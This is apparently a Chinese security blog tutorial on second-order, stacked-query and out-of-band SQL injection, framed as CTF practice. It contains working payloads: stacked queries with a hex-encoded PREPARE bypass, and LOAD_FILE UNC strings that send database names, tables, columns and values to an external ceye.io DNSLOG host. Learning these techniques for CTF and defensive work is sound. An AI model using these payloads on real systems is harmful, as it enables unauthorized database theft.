---
title: "sql4"
slug: sql4
cover: ""
date: 2025-03-25
halo:
  site: http://www.hzhsec.top
  name: cb881272-ae5b-4f9d-b466-b479db57e159
  publish: false
---

<!--more-->



<!-- 建议路径： content/漏洞复现/php-mysql-advanced-injection.md -->

# 概述

本篇记录二次注入、堆叠注入（stacked queries）与带外注入（out-of-band, OOB）三类进阶注入技术的思路、触发条件与常见 DEMO。适合在有一定 SQL 注入基础后用于实战与题型训练（如 CTF）。

---

# 一、二次注入（Second-order Injection）

## 1. 基本概念

二次注入是指**攻击者先把恶意内容写入应用（如注册、保存、修改操作），该数据并不立即触发注入；当应用在后续流程（例如 select 或 update）处再次使用这些已存数据进行 SQL 拼接时才触发注入**。

## 2. 常见场景

* 用户注册、个人信息填写、评论、简历等“写入后使用”的功能点。
* CMS 的个人中心、简历功能（例如 74CMS 的个人简历）等。

## 3. 判定思路

* 黑盒：查找具有写入并后续展示/处理的数据流（功能点）
* 白盒：查找 `INSERT` 后进入 `SELECT` 或 `UPDATE` 的代码路径

## 4. 注入条件

```text
插入时存在转义或自动处理（使插入数据可带单引号），且后续对插入数据再次拼接执行 SQL（SELECT/UPDATE）
```

若插入阶段对单引号做了转义（例如使用魔法函数或框架转义），后续再次拼接时可能导致转义不当或二次解析，从而触发二次注入。

---

# 二、堆叠注入（Stacked Queries）

## 1. 概念

堆叠注入通过结束符（如 `;`）在一个请求中执行多条 SQL 语句，前提是后端或驱动支持多语句执行（例如 PHP 的 `mysqli_multi_query()`）。

## 2. 触发条件

1. 目标存在 SQL 注入点；
2. 未对 `;` 等分隔符进行过滤；
3. 后端使用支持多语句的接口（如 `mysqli_multi_query`）或驱动允许多语句；
4. 数据库本身支持多语句（MySQL、MSSQL、PostgreSQL 等通常支持）。

## 3. CTF / 题型示例（强网题）

常见利用：

```
'; SHOW DATABASES;
'; SHOW TABLES;
'; SHOW COLUMNS FROM `1919810931114514`;
'; SELECT flag FROM `1919810931114514`;
```

当常规字符串被过滤（例如 `select` 被过滤）时，可以将语句转换为十六进制并用变量执行绕过：

```
'; SET @a=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460; PREPARE execsql FROM @a; EXECUTE execsql;
```

---

# 三、带外注入（Out-of-Band Injection, OOB）与 DNSLOG

## 1. 概念与适用场景

带外注入用于**无回显且无法通过延时或布尔注入获取数据**的场景。该方法利用数据库或主机执行外联（如 DNS 请求或 SMB 请求）触发外部平台记录，达到数据泄露的目的。

## 2. 基本条件

* 通常需要较高权限（如 `root`）或启用相关函数（如 `LOAD_FILE()`、`xp_cmdshell()` 等）；
* 存在能发起外部请求的函数或能力；
* 能使用外部平台（DNSLOG、CEYE 等）接收回连结果。

## 3. 常用平台

* `http://ceye.io`（需注册并使用 token）
* `http://www.dnslog.cn`（国内常用 DNSLOG 服务）

## 4. 常见 payload（使用 `LOAD_FILE` 利用 SMB/UNC 回连或 DNS 查询）

```sql
-- 使用 UNC 路径触发外联（Windows 风格）
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.your-identifier.ceye.io\\abc'));

-- MySQL 示例，查询当前数据库名并通过 UNC 回连
id=1 AND LOAD_FILE(CONCAT('\\\\', DATABASE(), '.dbuh8a.ceye.io\\asdt'))

-- 查询信息_schema 中的库名（用 LIMIT 控制回显序号）
id=1 AND LOAD_FILE(CONCAT('\\\\', (SELECT schema_name FROM information_schema.schemata LIMIT 0,1), '.dbuh8a.ceye.io\\xxx.txt'))

-- 查询版本号
id=1 AND LOAD_FILE(CONCAT('\\\\', VERSION(), '.dbuh8a.ceye.io\\xxx.txt'))

-- 查询某库的第一个表名
id=1 AND LOAD_FILE(CONCAT('\\\\', (SELECT table_name FROM information_schema.tables WHERE table_schema='demo01' LIMIT 0,1), '.dbuh8a.ceye.io\\xxx.txt'))

-- 查询列名
id=1 AND LOAD_FILE(CONCAT('\\\\', (SELECT column_name FROM information_schema.columns WHERE table_schema='security' AND table_name='emails' LIMIT 0,1), '.dbuh8a.ceye.io\\xxx.txt'))

-- 查询字段值（示例：security.emails.id 第一个值）
id=1 AND LOAD_FILE(CONCAT('\\\\', (SELECT id FROM security.emails LIMIT 0,1), '.dbuh8a.ceye.io\\xxx.txt'))
```

**说明**：

* 带外方法通常只能每次回显一个字段或一小段信息，需借助 `LIMIT`、`SUBSTR` 等逐步枚举；
* 有时 `LOAD_FILE` 受 `secure-file-priv` 或读取权限限制，无法直接读取本地文件，但可利用 UNC/SMB 回连触发外部日志。

---

# 四、小结

* 二次注入更隐蔽，重点在找到“写入-读取/处理”链路；
* 堆叠注入依赖后端是否允许多语句执行，适用于能执行多条 SQL 的场景；
* 带外注入是解决无回显环境的强力手段，但依赖外部平台与主机能发起网络请求的能力；
* 在实战中注意合规与授权范围，避免危害目标系统。

---

# 参考
* CTF 题解与强网杯 writeup